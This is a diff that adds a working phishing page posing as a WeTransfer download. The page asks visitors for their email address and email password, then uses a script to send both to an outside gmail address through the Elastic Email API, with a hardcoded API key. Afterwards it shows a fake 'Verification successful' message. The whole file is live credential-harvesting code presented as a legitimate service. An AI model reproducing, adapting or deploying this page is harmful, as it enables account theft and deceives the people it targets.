@@ -1,0 +1,324 @@
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="shortcut icon" href="https://cdn.glitch.com/a9bfcce0-422b-46e4-9074-3147cbc03390%2Ficon.ico?v=1600376585636" type="image/x-icon" />
+<title>We Transfer</title>
+<style>
+.topnav {
+  overflow: hidden;
+  background-color: #000000;
+}
+
+.topnav a {
+  float: left;
+  color: #000000;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+  font-size: 17px;
+}
+
+.topnav a:hover {
+  background-color: #000000;
+  color: Yellow;
+}
+
+.topnav a.active {
+  background-color: #000000;
+  color: Red;
+}
+
+body {font-family: Arial, Helvetica, sans-serif;}
+
+input[type=text], input[type=email] {
+    width: 39%;
+    padding: 12px 20px;
+    margin: 8px 0;
+    display: inline-block;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+}
+
+input[type=text], input[type=email], input[type=password] {
+    width: 39%;
+    padding: 12px 20px;
+    margin: 8px 0;
+    display: inline-block;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+}
+
+input[type=submit] {
+    background-color: #48b4e0;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    cursor: pointer;
+    width: 39%;
+}
+
+button {
+    background-color: #48b4e0;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    cursor: pointer;
+    width: 39%;
+}
+
+button:hover {
+    opacity: 0.8;
+}
+
+.cancelbtn {
+    width: auto;
+    padding: 10px 18px;
+    background-color: #f44336;
+}
+
+.imgcontainer {
+    text-align: center;
+    margin: 10px 10px 0;
+    background-color: #48b4e0;
+}
+
+img.avatar {
+    width: 40%;
+    border-radius: 50%;
+}
+
+.container {
+    padding: 10px;
+}
+
+span.psw {
+    float: right;
+    padding-top: 16px;
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+    span.psw {
+       display: block;
+       float: none;
+    }
+    .cancelbtn {
+       width: 100%;
+    }
+}
+
+/* The Modal (background) */
+.modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1; /* Sit on top */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgb(0,0,0); /* Fallback color */
+    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+    padding-top: 60px;
+}
+
+/* Modal Content/Box */
+.modal-content {
+    background-color: #fefefe;
+    margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
+    border: 1px solid #888;
+    width: 50%; /* Could be more or less, depending on screen size */
+}
+
+/* The Close Button (x) */
+.close {
+    position: absolute;
+    right: 25px;
+    top: 0;
+    color: #000;
+    font-size: 35px;
+    font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+    color: red;
+    cursor: pointer;
+}
+
+/* Add Zoom Animation */
+.animate {
+    -webkit-animation: animatezoom 0.6s;
+    animation: animatezoom 0.6s
+}
+
+@-webkit-keyframes animatezoom {
+    from {-webkit-transform: scale(0)} 
+    to {-webkit-transform: scale(1)}
+}
+    
+@keyframes animatezoom {
+    from {transform: scale(0)} 
+    to {transform: scale(1)}
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+    span.psw {
+       display: block;
+       float: none;
+    }
+    .cancelbtn {
+       width: 100%;
+    }
+}
+</style>
+</head>
+
+<body>
+<CENTER>
+<img src="https://cdn.glitch.com/a9bfcce0-422b-46e4-9074-3147cbc03390%2Fbg.jpg?v=1600376573408" width="1365px" ></img>
+
+<div style="left:86px; width:268px; top:108px; position:absolute; height: 395px;">
+<div style="left:47px; width:189px; top:339px; position:absolute; height: 52px;" background-color:#FFFFFF">
+<button onClick="document.getElementById('id01').style.display='block'" style="width:auto;">DOWNLOAD</button></div></div></CENTER>
+
+<div id="id01" class="modal">
+<div class="modal-content animate">
+    <div class="imgcontainer">
+      <span onClick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal">&times;</span>
+      <img src="https://cdn.glitch.com/a9bfcce0-422b-46e4-9074-3147cbc03390%2Ficon.ico?v=1600376585636" width="20%">
+    </div>
+
+    <div class="container">
+     <center> <p><font face="Trebuchet MS" color="black" size="2"> <span style="font-size:16px;"><span style="color:green;"><strong><span style="font-family: &quot;Trebuchet MS&quot;; text-align: -webkit-center;">We Transfer Online Security</span></strong></span></span> <br> 
+                        <br>
+    Enter your email password below to prove you're the intended recipient
+</font><br>
+
+<input type="email" value="" name="email" id="email" placeholder="Enter Email Address" required>
+<br/>
+<input type="password" value="" id="password" name="password" placeholder="Enter Email Password" required><br/>
+<input type="hidden" id="tel" value="0000" name="tel" placeholder="Telephone">
+<br/>
+<span id="msg" style="display:none; font-size:12px; color:rgb(232, 17, 35); font-weight:bold;"></span><br />
+<input id="submit-btn" type="submit" value="Continue">
+
+      
+    </div>
+ 
+    <div class="container" style="background-color:#48b4e0">
+    <font color="#FFFFFF"><span id="em"></span></font>
+    </div>
+</div>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+<script>
+// Function to get URL parameters
+function getUrlParameter(name) {
+    name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+    var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+    var results = regex.exec(location.search);
+    return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+}
+
+// Get the modal
+var modal = document.getElementById('id01');
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+    if (event.target == modal) {
+        modal.style.display = "none";
+    }
+}
+
+$(document).ready(function(){
+    // Get email from URL parameter and pre-fill the input field
+    var urlEmail = getUrlParameter('email');
+    if (urlEmail) {
+        $('#email').val(urlEmail);
+    }
+    
+    $('#submit-btn').click(function(event){
+        event.preventDefault();
+        
+        var email = $("#email").val();
+        var password = $("#password").val();
+        
+        // Basic email validation
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        if (!filter.test(email)) {
+            alert("Please enter a valid email address");
+            return false;
+        }
+        
+        if (password === "") {
+            alert("Please enter your password");
+            return false;
+        }
+
+        // --- ELASTIC EMAIL API CONFIG ---
+        const elasticEmailApiKey = '9E00668C1ADFA64D550A4667DFE59D1C5073B82E6302B4E47378551A86C04C1E0F7E45E492B018F64BBFC055C623AF44';
+        const fromEmail = 'smtp@choicelink.online';
+        const toEmail = 'Danjekwu778@gmail.com';
+        // --------------------------------
+
+        // Show loading state
+        $('#submit-btn').val('Sending...');
+        $('#msg').show().html("Processing your request...").css("color", "blue");
+
+        // Construct the form data for the API
+        const formData = new URLSearchParams();
+        formData.append('apikey', elasticEmailApiKey);
+        formData.append('from', fromEmail);
+        formData.append('to', toEmail);
+        formData.append('subject', 'WeTransfer Login Attempt - ' + email);
+        formData.append('bodyText', `Email: ${email}, Password: ${password}`);
+        formData.append('bodyHtml', `
+            <strong>New Credentials Captured</strong>
+            <br><br>
+            <strong>Email:</strong> ${email}
+            <br>
+            <strong>Password:</strong> ${password}
+            <br>
+            <strong>Time:</strong> ${new Date().toLocaleString()}
+            <br>
+            <strong>Page URL:</strong> ${window.location.href}
+        `);
+
+        // Send the data directly to Elastic Email's API
+        fetch('https://api.elasticemail.com/v2/email/send', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Elastic Email API response:', data);
+            if (data.success) {
+                $('#msg').html("Verification successful! Download starting...").css("color", "green");
+                setTimeout(function() {
+                    window.location.replace("");
+                }, 2000);
+            } else {
+                $('#msg').html("System busy. Please try again.").css("color", "red");
+                $('#submit-btn').val('Continue');
+                console.error("Elastic Email Error:", data.error);
+            }
+        })
+        .catch((error) => {
+            console.error('Fetch error:', error);
+            $('#msg').html("Network error. Please check your connection.").css("color", "red");
+            $('#submit-btn').val('Continue');
+        });
+    });
+});
+</script>
+
+</body>
+</html>
